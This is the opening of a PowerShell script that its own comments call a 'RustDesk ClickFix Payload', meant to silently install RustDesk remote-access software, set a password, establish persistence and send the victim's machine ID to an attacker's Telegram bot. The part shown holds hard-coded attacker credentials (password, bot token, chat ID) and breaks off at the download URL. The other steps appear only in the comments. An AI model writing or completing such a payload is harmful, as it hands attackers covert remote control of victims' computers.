# s.ps1 - RustDesk ClickFix Payload
# This script installs RustDesk silently, sets the password, 
# establishes persistence, and exfiltrates the ID to Telegram.

# 1. Attacker Credentials
$pw = "AttackerSecret123!"
$token = "8800944118:AAH5fH76MZUomwJZVEuFHPIf0X3tgAJ25mM"
$chatId = "2030209395"

# 2. Download Official Installer
$url = "